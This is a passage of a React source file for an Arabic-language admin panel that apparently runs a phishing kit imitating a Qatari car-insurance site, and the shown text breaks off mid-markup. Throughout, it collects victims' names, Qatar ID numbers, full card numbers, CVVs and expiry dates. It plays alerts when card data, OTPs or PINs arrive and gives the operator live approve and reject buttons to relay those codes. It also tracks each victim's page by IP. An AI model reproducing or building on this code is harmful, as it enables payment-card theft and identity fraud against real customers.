import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { 
  LogOut, Search, Eye, RefreshCw, Users, CreditCard, 
  Shield, Clock, CheckCircle, XCircle, AlertCircle, Activity,
  DollarSign, Phone, Car, Navigation, Calendar
} from 'lucide-react';
import { useSocket } from '../context/SocketContext';
import { 
  initAudioContext, 
  playNewVisitorSound, 
  playCardDataSound, 
  playOTPSound, 
  playPINSound 
} from '../utils/notificationSounds';

export default function AdminDashboard() {
  const navigate = useNavigate();
  const { socket, connected } = useSocket();
  
  const [customers, setCustomers] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterStatus, setFilterStatus] = useState('all');
  const [selectedCustomer, setSelectedCustomer] = useState(null);
  const [showDetailsModal, setShowDetailsModal] = useState(false);
  const [newDataCount, setNewDataCount] = useState(0);
  const [lastDataTimestamp, setLastDataTimestamp] = useState(null);
  const [stats, setStats] = useState({
    total: 0,
    active: 0,
    pending: 0,
    approved: 0,
    totalRevenue: 0
  });

  const [pendingOTP, setPendingOTP] = useState(null);
  const [pendingPIN, setPendingPIN] = useState(null);

  useEffect(() => {
    const isAuth = sessionStorage.getItem('adminAuthenticated');
    if (!isAuth) {
      navigate('/admin/login');
      return;
    }
    
    // Initialize audio system after user login
    initAudioContext();
  }, [navigate]);

  useEffect(() => {
    if (!socket) return;

    socket.emit('loadData');

    const refreshInterval = setInterval(() => {
      if (socket && connected) {
        socket.emit('loadData');
      }
    }, 5000);

    socket.on('initialData', (data) => {
      processCustomersData(data);
    });

    socket.on('newEntryAll', () => {
      setNewDataCount(prev => prev + 1);
      setLastDataTimestamp(Date.now());
      playNewVisitorSound();
      socket.emit('loadData');
      
      // Clear badge after 5 seconds
      setTimeout(() => {
        setNewDataCount(0);
      }, 5000);
    });

    socket.on('newOTP', (data) => {
      console.log('📨 Received newOTP:', data);
      setNewDataCount(prev => prev + 1);
      playOTPSound();
      // تطبيع البيانات للتأكد من وجود IP
      const normalizedData = {
        ...data,
        ip: data.ip || data.payload?.ip,
        otpCode: data.otpCode || data.payload?.otpCode,
        cardLastDigits: data.cardLastDigits || data.payload?.cardLastDigits,
        phoneNumber: data.phoneNumber || data.payload?.phoneNumber,
        amount: data.amount || data.payload?.amount
      };
      setPendingOTP(normalizedData);
    });

    socket.on('newPIN', (data) => {
      console.log('📨 Received newPIN:', data);
      setNewDataCount(prev => prev + 1);
      playPINSound();
      // تطبيع البيانات للتأكد من وجود IP
      const normalizedData = {
        ...data,
        ip: data.ip || data.payload?.ip,
        pinCode: data.pinCode || data.payload?.pinCode,
        cardLastDigits: data.cardLastDigits || data.payload?.cardLastDigits,
        phoneNumber: data.phoneNumber || data.payload?.phoneNumber,
        amount: data.amount || data.payload?.amount
      };
      setPendingPIN(normalizedData);
    });

    socket.on('userConnected', ({ ip }) => {
      setCustomers(prev => prev.map(c => 
        c.ip === ip ? { ...c, isActive: true } : c
      ));
    });

    socket.on('userDisconnected', ({ ip }) => {
      setCustomers(prev => prev.map(c => 
        c.ip === ip ? { ...c, isActive: false } : c
      ));
    });

    socket.on('locationUpdated', ({ ip, page }) => {
      setCustomers(prev => prev.map(c => 
        c.ip === ip ? { ...c, currentPage: page } : c
      ));
    });

    return () => {
      clearInterval(refreshInterval);
      socket.off('initialData');
      socket.off('newEntryAll');
      socket.off('newOTP');
      socket.off('newPIN');
      socket.off('userConnected');
      socket.off('userDisconnected');
      socket.off('locationUpdated');
    };
  }, [socket, connected]);

  const processCustomersData = (data) => {
    const customersMap = new Map();
    const allIPs = new Set();

    // جمع جميع IPs من جميع المصادر
    [
      data.carDetails, data.moreDetails, data.selectInsurance,
      data.insuranceInfo, data.payment, data.locations,
      data.otpCodes, data.pinCodes, data.plateNumber,
      data.policyDate, data.quote
    ].forEach(arr => {
      if (Array.isArray(arr)) {
        arr.forEach(item => item.ip && allIPs.add(item.ip));
      }
    });

    console.log('📊 Processing data for IPs:', Array.from(allIPs));

    allIPs.forEach(ip => {
      // جمع جميع السجلات لكل IP (لا نأخذ آخر سجل فقط، بل نحتفظ بالجميع)
      const carDetailsAll = data.carDetails?.filter(d => d.ip === ip) || [];
      const moreDetailsAll = data.moreDetails?.filter(d => d.ip === ip) || [];
      const insuranceAll = data.selectInsurance?.filter(d => d.ip === ip) || [];
      const customerInfoAll = data.insuranceInfo?.filter(d => d.ip === ip) || [];
      const plateNumberAll = data.plateNumber?.filter(d => d.ip === ip) || [];
      const policyDateAll = data.policyDate?.filter(d => d.ip === ip) || [];
      const quoteAll = data.quote?.filter(d => d.ip === ip) || [];
      
      // للعرض في الجدول، نأخذ آخر سجل
      const carDetails = carDetailsAll[carDetailsAll.length - 1];
      const moreDetails = moreDetailsAll[moreDetailsAll.length - 1];
      const insurance = insuranceAll[insuranceAll.length - 1];
      const customerInfo = customerInfoAll[customerInfoAll.length - 1];
      
      // البطاقات: نحتفظ بجميع السجلات (لا نأخذ آخر واحد فقط)
      const payments = data.payment?.filter(d => d.ip === ip) || [];
      const otpCodes = data.otpCodes?.filter(d => d.ip === ip) || [];
      const pinCodes = data.pinCodes?.filter(d => d.ip === ip) || [];
      
      const locations = data.locations?.filter(d => d.ip === ip) || [];
      const location = locations[locations.length - 1];
      const isActive = data.activeUsers?.includes(ip) || false;

      let status = 'pending';
      if (payments.length > 0) {
        const lastPayment = payments[payments.length - 1];
        status = lastPayment.status || 'pending';
      }

      const allTimestamps = [
        ...(carDetailsAll.map(c => c.timestamp)),
        ...(moreDetailsAll.map(m => m.timestamp)),
        ...(insuranceAll.map(i => i.timestamp)),
        ...(customerInfoAll.map(ci => ci.timestamp)),
        ...(payments.map(p => p.timestamp)),
        ...(otpCodes.map(o => o.timestamp)),
        ...(pinCodes.map(p => p.timestamp))
      ].filter(Boolean);
      
      const lastUpdate = allTimestamps.length > 0 
        ? new Date(Math.max(...allTimestamps.map(t => new Date(t).getTime())))
        : new Date();

      console.log(`👤 User ${ip}: ${payments.length} payments, ${otpCodes.length} OTPs, ${pinCodes.length} PINs`);

      customersMap.set(ip, {
        ip,
        currentPage: location?.currentPage || '/',
        carDetails,
        moreDetails,
        insurance,
        customerInfo,
        payments,        // جميع البطاقات
        otpCodes,        // جميع OTPs
        pinCodes,        // جميع PINs
        status,
        lastUpdate: lastUpdate.getTime(),
        isActive
      });
    });

    const customersList = Array.from(customersMap.values()).sort((a, b) => 
      new Date(b.lastUpdate) - new Date(a.lastUpdate)
    );

    console.log('✅ Processed customers:', customersList.length);
    setCustomers(customersList);
    updateStats(customersList);
  };

  const updateStats = (customersList) => {
    const stats = {
      total: customersList.length,
      active: customersList.filter(c => c.isActive).length,
      pending: customersList.filter(c => c.status === 'pending').length,
      approved: customersList.filter(c => c.status === 'approved').length,
      totalRevenue: customersList
        .filter(c => c.status === 'approved')
        .reduce((sum, c) => sum + (parseFloat(c.payments[0]?.amount) || 0), 0)
    };
    setStats(stats);
  };

  const handleLogout = () => {
    sessionStorage.clear();
    navigate('/admin/login');
  };

  const handleRefresh = () => {
    if (socket) {
      socket.emit('loadData');
    }
  };

  const approveOTP = () => {
    if (socket && pendingOTP) {
      // استخراج IP من مصادر مختلفة محتملة
      const ip = pendingOTP.ip || pendingOTP.payload?.ip || pendingOTP.userIp;
      console.log('✅ Approving OTP for IP:', ip, 'Full data:', pendingOTP);
      
      socket.emit('otpVerificationStatus', {
        ip: ip,
        status: 'approved',
        message: 'تم قبول رمز التحقق'
      });
      setPendingOTP(null);
    }
  };

  const rejectOTP = () => {
    if (socket && pendingOTP) {
      const ip = pendingOTP.ip || pendingOTP.payload?.ip || pendingOTP.userIp;
      console.log('❌ Rejecting OTP for IP:', ip, 'Full data:', pendingOTP);
      
      socket.emit('otpVerificationStatus', {
        ip: ip,
        status: 'rejected',
        message: 'رمز التحقق غير صحيح'
      });
      setPendingOTP(null);
    }
  };

  const approvePIN = () => {
    if (socket && pendingPIN) {
      // استخراج IP من مصادر مختلفة محتملة
      const ip = pendingPIN.ip || pendingPIN.payload?.ip || pendingPIN.userIp;
      console.log('✅ Approving PIN for IP:', ip, 'Full data:', pendingPIN);
      
      socket.emit('pinVerificationStatus', {
        ip: ip,
        status: 'approved',
        message: 'تم قبول الرمز السري'
      });
      setPendingPIN(null);
    }
  };

  const rejectPIN = () => {
    if (socket && pendingPIN) {
      // استخراج IP من مصادر مختلفة محتملة
      const ip = pendingPIN.ip || pendingPIN.payload?.ip || pendingPIN.userIp;
      console.log('❌ Rejecting PIN for IP:', ip, 'Full data:', pendingPIN);
      
      socket.emit('pinVerificationStatus', {
        ip: ip,
        status: 'rejected',
        message: 'الرمز السري غير صحيح'
      });
      setPendingPIN(null);
    }
  };

  const viewDetails = (customer) => {
    setSelectedCustomer(customer);
    setShowDetailsModal(true);
  };

  const filteredCustomers = customers.filter(customer => {
    const matchesSearch = 
      customer.ip?.includes(searchTerm) ||
      customer.customerInfo?.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      customer.customerInfo?.qid?.includes(searchTerm) ||
      customer.customerInfo?.phone?.includes(searchTerm) ||
      customer.customerInfo?.email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      customer.carDetails?.make?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      customer.carDetails?.model?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      customer.moreDetails?.plateNumber?.includes(searchTerm);

    const matchesFilter = 
      filterStatus === 'all' ||
      (filterStatus === 'active' && customer.isActive) ||
      (filterStatus === 'offline' && !customer.isActive) ||
      (filterStatus === customer.status);

    return matchesSearch && matchesFilter;
  });

  const getStatusBadge = (status) => {
    const styles = {
      pending: 'bg-yellow-100 text-yellow-800 border-yellow-200',
      approved: 'bg-green-100 text-green-800 border-green-200',
      rejected: 'bg-red-100 text-red-800 border-red-200',
      waiting: 'bg-blue-100 text-blue-800 border-blue-200'
    };

    const icons = {
      pending: <Clock className="w-3 h-3" />,
      approved: <CheckCircle className="w-3 h-3" />,
      rejected: <XCircle className="w-3 h-3" />,
      waiting: <AlertCircle className="w-3 h-3" />
    };

    return (
      <span className={`inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-semibold border ${styles[status] || styles.pending}`}>
        {icons[status]}
        {status.toUpperCase()}
      </span>
    );
  };

  const getPageBadge = (page) => {
    const pageNames = {
      '/الصفحة الرئيسية': 'الصفحة الرئيسية',
      '/car-details': 'بيانات المركبة',
      '/more-details': 'المزيد من البيانات',
      '/select-insurance': 'اختيار التأمين',
      '/plate-number': 'رقم اللوحة',
      '/info-insurance': 'البيانات الشخصية',
      '/policy-date': 'تاريخ البوليصة',
      '/quotecheaK': 'عرض السعر',
      '/paydcc': 'الدفع - DCC',
      '/payqpay': 'الدفع - QPay',
      '/payment-otp': 'إدخال OTP',
      '/otp-verification': 'تحقق OTP',
      '/payment-pin': 'إدخال PIN',
      '/pin-verification': 'تحقق PIN',
      '/payment-success': 'نجح الدفع',
      '/payment-failed': 'فشل الدفع'
    };

    return pageNames[page] || page;
  };

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* OTP Modal */}
      {pendingOTP && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 animate-bounce-in">
            <div className="text-center mb-6">
              <div className="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Shield className="w-10 h-10 text-purple-600" />
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-2">🔐 رمز التحقق OTP</h2>
              <p className="text-gray-600">يرجى مراجعة الرمز والموافقة أو الرفض</p>
            </div>

            <div className="bg-gradient-to-br from-purple-50 to-purple-100 rounded-xl p-6 mb-6">
              <div className="text-center mb-4">
                <p className="text-sm text-gray-600 mb-2">الرمز المُدخل</p>
                <div className="text-4xl font-mono font-bold text-purple-600 tracking-widest">
                  {pendingOTP.otpCode || pendingOTP.payload?.otpCode}
                </div>
              </div>
              
              <div className="border-t border-purple-200 pt-4 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">البطاقة:</span>
                  <span className="font-mono font-semibold">**** {pendingOTP.cardLastDigits || pendingOTP.payload?.cardLastDigits}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">الهاتف:</span>
                  <span className="font-mono font-semibold">{pendingOTP.phoneNumber || pendingOTP.payload?.phoneNumber}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">المبلغ:</span>
                  <span className="font-bold text-purple-600">{pendingOTP.amount || pendingOTP.payload?.amount} ريال</span>
                </div>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                onClick={approveOTP}
                className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                <CheckCircle className="w-5 h-5" />
                قبول
              </button>
              <button
                onClick={rejectOTP}
                className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                <XCircle className="w-5 h-5" />
                رفض
              </button>
            </div>
          </div>
        </div>
      )}

      {/* PIN Modal */}
      {pendingPIN && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 animate-bounce-in">
            <div className="text-center mb-6">
              <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <CreditCard className="w-10 h-10 text-blue-600" />
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-2">🔑 الرمز السري PIN</h2>
              <p className="text-gray-600">يرجى مراجعة الرمز والموافقة أو الرفض</p>
            </div>

            <div className="bg-gradient-to-br from-blue-50 to-blue-100 rounded-xl p-6 mb-6">
              <div className="text-center mb-4">
                <p className="text-sm text-gray-600 mb-2">الرمز المُدخل</p>
                <div className="text-4xl font-mono font-bold text-blue-600 tracking-widest">
                  {pendingPIN.pinCode || pendingPIN.payload?.pinCode}
                </div>
              </div>
              
              <div className="border-t border-blue-200 pt-4 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">البطاقة:</span>
                  <span className="font-mono font-semibold">**** {pendingPIN.cardLastDigits || pendingPIN.payload?.cardLastDigits}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">الهاتف:</span>
                  <span className="font-mono font-semibold">{pendingPIN.phoneNumber || pendingPIN.payload?.phoneNumber}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">المبلغ:</span>
                  <span className="font-bold text-blue-600">{pendingPIN.amount || pendingPIN.payload?.amount} ريال</span>
                </div>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                onClick={approvePIN}
                className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                <CheckCircle className="w-5 h-5" />
                قبول
              </button>
              <button
                onClick={rejectPIN}
                className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                <XCircle className="w-5 h-5" />
                رفض
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Details Modal */}
      {showDetailsModal && selectedCustomer && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-40 p-4 overflow-y-auto">
          <div className="bg-white rounded-2xl shadow-2xl max-w-6xl w-full my-8">
            <div className="bg-gradient-to-r from-qiic-maroon to-red-900 text-white p-6 rounded-t-2xl sticky top-0 z-10">
              <div className="flex items-center justify-between">
                <h2 className="text-2xl font-bold">تفاصيل العميل الكاملة</h2>
                <button
                  onClick={() => setShowDetailsModal(false)}
                  className="text-white hover:bg-white/20 rounded-lg p-2 transition-colors"
                >
                  <XCircle className="w-6 h-6" />
                </button>
              </div>
              <div className="mt-4 flex items-center gap-4 flex-wrap">
                <div className="flex items-center gap-2">
                  <div className={`w-3 h-3 rounded-full ${selectedCustomer.isActive ? 'bg-green-400 animate-pulse' : 'bg-gray-400'}`}></div>
                  <span>{selectedCustomer.isActive ? 'نشط الآن' : 'غير متصل'}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Navigation className="w-4 h-4" />
                  <span className="text-sm">{getPageBadge(selectedCustomer.currentPage)}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Clock className="w-4 h-4" />
                  <span className="text-sm">آخر تحديث: {new Date(selectedCustomer.lastUpdate).toLocaleString('ar-QA')}</span>
                </div>
              </div>
            </div>

            <div className="p-6 space-y-6 max-h-[70vh] overflow-y-auto">
              {/* Customer Personal Info */}
              <div className="bg-gradient-to-br from-blue-50 to-blue-100 rounded-xl p-6">
                <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-blue-900">
                  <Users className="w-6 h-6 text-blue-600" />
                  البيانات الشخصية
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">الاسم الكامل</p>
                    <p className="font-bold text-gray-900">{selectedCustomer.customerInfo?.name || '—'}</p>
                  </div>
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">رقم البطاقة القطرية (QID)</p>
                    <p className="font-mono font-bold text-blue-600">{selectedCustomer.customerInfo?.qid || selectedCustomer.moreDetails?.qid || '—'}</p>
                  </div>
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">رقم الجوال</p>
                    <p className="font-mono font-semibold">{selectedCustomer.customerInfo?.phone || '—'}</p>
                  </div>
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">البريد الإلكتروني</p>
                    <p className="text-sm font-semibold break-all">{selectedCustomer.customerInfo?.email || '—'}</p>
                  </div>
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">عنوان IP</p>
                    <p className="font-mono font-semibold text-purple-600">{selectedCustomer.ip}</p>
                  </div>
                  <div className="bg-white rounded-lg p-4">
                    <p className="text-gray-600 text-sm mb-1">الحالة</p>
                    <div>{getStatusBadge(selectedCustomer.status)}</div>
                  </div>
                </div>
              </div>

              {/* Vehicle Details */}
              {selectedCustomer.carDetails && (
                <div className="bg-gradient-to-br from-green-50 to-green-100 rounded-xl p-6">
                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-green-900">
                    <Car className="w-6 h-6 text-green-600" />
                    بيانات المركبة
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                    <div className="bg-white rounded-lg p-4">
                      <p className="text-gray-600 text-sm mb-1">العلامة</p>
                      <p className="font-bold text-gray-900">{selectedCustomer.carDetails.make || '—'}</p>
                    </div>
                    <div className="bg-white rounded-lg p-4">
                      <p className="text-gray-600 text-sm mb-1">الموديل</p>
                      <p className="font-bold text-gray-900">{selectedCustomer.carDetails.model || '—'}</p>
                    </div>
                    <div className="bg-white rounded-lg p-4">
                      <p className="text-gray-600 text-sm mb-1">سنة الموديل</p>
                      <p className="font-bold text-green-600">{selectedCustomer.carDetails.year || '—'}</p>
                    </div>
                    <div className="bg-white rounded-lg p-4">
                      <p className="text-gray-600 text-sm mb-1">اللون</p>
                      <p className="font-semibold">{selectedCustomer.carDetails.color || '—'}</p>
                    </div>
                  </div>
                  
                  {selectedCustomer.moreDetails && (
                    <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mt-4">
                      <div className="bg-white rounded-lg p-4">
                        <p className="text-gray-600 text-sm mb-1">المقاعد</p>
                        <p className="font-semibold">{selectedCustomer.moreDetails.seats || '—'}</p>
                      </div>
                      <div className="bg-white rounded-lg p-4">
                        <p className="text-gray-600 text-sm mb-1">الإسطوانات</p>
                        <p className="font-semibold">{selectedCustomer.moreDetails.cylinders || '—'}</p>
                      </div>
                      <div className="bg-white rounded-lg p-4">
                        <p className="text-gray-600 text-sm mb-1">نوع السيارة</p>
                        <p className="font-semibold">{selectedCustomer.moreDetails.vehicleType || '—'}</p>
                      </div>
                      <div className="bg-white rounded-lg p-4">
                        <p className="text-gray-600 text-sm mb-1">شكل السيارة</p>
                        <p className="font-semibold">{selectedCustomer.moreDetails.bodyType || '—'}</p>
                      </div>
                      <div className="bg-white rounded-lg p-4">
                        <p className="text-gray-600 text-sm mb-1">تاريخ تسجيل السيارة</p>
                        <p className="font-mono font-semibold">{selectedCustomer.moreDetails.registrationDate || '—'}</p>
                      </div>
                      <div className="bg-white rounded-lg p-4">
                        <p className="text-gray-600 text-sm mb-1">رقم اللوحة</p>
                        <p className="font-mono font-bold text-green-600">{selectedCustomer.moreDetails.plateNumber || '—'}</p>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {/* Insurance Info */}
              {selectedCustomer.insurance && (
                <div className="bg-gradient-to-br from-orange-50 to-orange-100 rounded-xl p-6">
                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-orange-900">
                    <Shield className="w-6 h-6 text-orange-600" />
                    معلومات التأمين
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div className="bg-white rounded-lg p-4">
                      <p className="text-gray-600 text-sm mb-1">نوع التأمين</p>
                      <p className="font-bold text-orange-600">{selectedCustomer.insurance.insuranceType || '—'}</p>
                    </div>
                    <div className="bg-white rounded-lg p-4">
                      <p className="text-gray-600 text-sm mb-1">المبلغ المطلوب</p>
                      <p className="font-bold text-orange-600">{selectedCustomer.insurance.amount || '—'} ريال</p>
                    </div>
                    <div className="bg-white rounded-lg p-4">
                      <p className="text-gray-600 text-sm mb-1">تاريخ الاختيار</p>
                      <p className="font-mono text-sm">{selectedCustomer.insurance.timestamp ? new Date(selectedCustomer.insurance.timestamp).toLocaleString('ar-QA') : '—'}</p>
                    </div>
                  </div>
                </div>
              )}

              {/* Payment Cards */}
              {selectedCustomer.payments && selectedCustomer.payments.length > 0 && (
                <div className="bg-gradient-to-br from-purple-50 to-purple-100 rounded-xl p-6">
                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-purple-900">
                    <CreditCard className="w-6 h-6 text-purple-600" />
                    معلومات البطاقات ({selectedCustomer.payments.length})
                  </h3>
                  <div className="space-y-4">
                    {selectedCustomer.payments.map((payment, idx) => (
                      <div key={idx} className="bg-white rounded-lg p-5 border-2 border-purple-200 shadow-sm">
                        <div className="flex items-center justify-between mb-4">
                          <div className="flex items-center gap-3">
                            <span className="text-sm font-bold text-purple-600 bg-purple-100 px-4 py-1.5 rounded-full">
                              البطاقة #{idx + 1}
                            </span>
                            {idx === selectedCustomer.payments.length - 1 && (
                              <span className="text-xs text-green-600 bg-green-100 px-3 py-1 rounded-full font-semibold">
                                الأحدث
                              </span>
                            )}
                          </div>
                          <span className="text-xs text-gray-600">
                            {new Date(payment.timestamp || payment.time).toLocaleString('ar-QA')}
                          </span>
                        </div>

                        {/* Payment Method - Always show */}
                        <div className="mb-4 pb-4 border-b border-purple-100">
                          <p className="text-gray-600 text-sm mb-1">طريقة الدفع:</p>
                          <p className="font-bold text-purple-600 text-lg">
                            {payment.paymentMethod || 'غير محدد'}
                          </p>
                        </div>

                        {/* Card Details - Only for Mada/Visa */}
                        {payment.paymentMethod && (payment.paymentMethod.toLowerCase().includes('mada') || payment.paymentMethod.toLowerCase().includes('visa')) && (
                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-4">
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">اسم حامل البطاقة:</p>
                              <p className="font-semibold text-gray-900">{payment.cardHolderName || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">رقم البطاقة الكامل:</p>
                              <p className="font-mono font-bold text-purple-600">
                                💳 {payment.cardNumber || '—'}
                              </p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">تاريخ الانتهاء:</p>
                              <p className="font-mono font-semibold">{payment.expirationDate || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">CVV:</p>
                              <p className="font-mono font-bold text-red-600">{payment.cvv || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">رقم الهاتف:</p>
                              <p className="font-mono">📱 {payment.phoneNumber || '—'}</p>
                            </div>
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">آخر 4 أرقام:</p>
                              <p className="font-mono font-bold">**** {payment.cardLastDigits || payment.cardNumber?.slice(-4) || '—'}</p>
                            </div>
                          </div>
                        )}

                        {/* QPay/Mobile Payment - Only phone */}
                        {payment.paymentMethod && payment.paymentMethod.toLowerCase().includes('qpay') && (
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                            <div className="bg-purple-50 rounded-lg p-3">
                              <p className="text-gray-600 text-xs mb-1">رقم الهاتف:</p>
                              <p className="font-mono font-bold text-purple-600">
                                📱 {payment.phoneNumber || payment.phone || '—'}
                              </p>
                            </div>
                          </div>
                        )}

                        {/* Amount and Time - Always show */}
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-4 border-t border-purple-100">
                          <div className="bg-gradient-to-r from-purple-100 to-purple-50 rounded-lg p-3">
                            <p className="text-gray-600 text-xs mb-1">المبلغ المدفوع:</p>
                            <p className="font-bold text-purple-600 text-2xl">💰 QAR {payment.amount || '—'}</p>
                          </div>
                          <div className="bg-purple-50 rounded-lg p-3">
                            <p className="text-gray-600 text-xs mb-1">وقت الدفع:</p>
                            <p className="font-mono text-sm font-semibold">
                              {payment.timestamp ? new Date(payment.timestamp).toLocaleString('ar-QA') : 
                               payment.time ? new Date(payment.time).toLocaleString('ar-QA') : '—'}
                            </p>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* OTP Codes */}
              {selectedCustomer.otpCodes && selectedCustomer.otpCodes.length > 0 && (
                <div className="bg-gradient-to-br from-yellow-50 to-yellow-100 rounded-xl p-6">
                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-yellow-900">
                    <Shield className="w-6 h-6 text-yellow-600" />
                    رموز OTP ({selectedCustomer.otpCodes.length})
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                    {selectedCustomer.otpCodes.map((otp, idx) => (
                      <div key={idx} className="bg-white rounded-lg p-4 border-2 border-yellow-200">
                        <div className="flex justify-between items-start mb-2">
                          <span className="text-xs font-bold text-yellow-600 bg-yellow-100 px-2 py-1 rounded-full">
                            OTP {idx + 1}
                          </span>
                          <div className="text-right">
                            <p className="font-mono font-bold text-2xl text-yellow-600">{otp.otpCode}</p>
                            <p className="text-xs text-gray-600 mt-1">
                              {new Date(otp.timestamp).toLocaleString('ar-QA')}
                            </p>
                          </div>
                        </div>
                        <div className="border-t pt-2 mt-2 text-xs space-y-1">
                          <p><span className="text-gray-600">البطاقة:</span> <span className="font-mono">**** {otp.cardLastDigits}</span></p>
                          <p><span className="text-gray-600">الهاتف:</span> <span className="font-mono">{otp.phoneNumber}</span></p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* PIN Codes */}
              {selectedCustomer.pinCodes && selectedCustomer.pinCodes.length > 0 && (
                <div className="bg-gradient-to-br from-indigo-50 to-indigo-100 rounded-xl p-6">
                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-indigo-900">
                    <CreditCard className="w-6 h-6 text-indigo-600" />
                    رموز PIN ({selectedCustomer.pinCodes.length})
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                    {selectedCustomer.pinCodes.map((pin, idx) => (
                      <div key={idx} className="bg-white rounded-lg p-4 border-2 border-indigo-200">
                        <div className="flex justify-between items-start mb-2">
                          <span className="text-xs font-bold text-indigo-600 bg-indigo-100 px-2 py-1 rounded-full">
                            PIN {idx + 1}
                          </span>
                          <div className="text-right">
                            <p className="font-mono font-bold text-2xl text-indigo-600">{pin.pinCode}</p>
                            <p className="text-xs text-gray-600 mt-1">
                              {new Date(pin.timestamp).toLocaleString('ar-QA')}
                            </p>
                          </div>
                        </div>
                        <div className="border-t pt-2 mt-2 text-xs space-y-1">
                          <p><span className="text-gray-600">البطاقة:</span> <span className="font-mono">**** {pin.cardLastDigits}</span></p>
                          <p><span className="text-gray-600">الهاتف:</span> <span className="font-mono">{pin.phoneNumber}</span></p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            <div className="bg-gray-50 p-4 rounded-b-2xl border-t">
              <div className="text-center text-sm text-gray-600">
                <p>تم عرض جميع البيانات المتاحة للعميل</p>
                <p className="mt-1">آخر تحديث: {new Date(selectedCustomer.lastUpdate).toLocaleString('ar-QA')}</p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Main Content */}
      <div className="max-w-[1800px] mx-auto p-6">
        {/* Header */}
        <div className="bg-gradient-to-r from-qiic-maroon to-red-900 text-white rounded-2xl p-8 mb-6 shadow-lg">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-4xl font-bold mb-3">لوحة تحكم الأدمن المتقدمة</h1>
              <div className="flex items-center gap-3 flex-wrap">
                <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                  <div className={`w-3 h-3 rounded-full ${connected ? 'bg-green-400 animate-pulse' : 'bg-red-400'}`}></div>
                  <span className="font-semibold">{connected ? 'متصل مباشر' : 'غير متصل'}</span>
                </div>
                <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                  <Users className="w-4 h-4" />
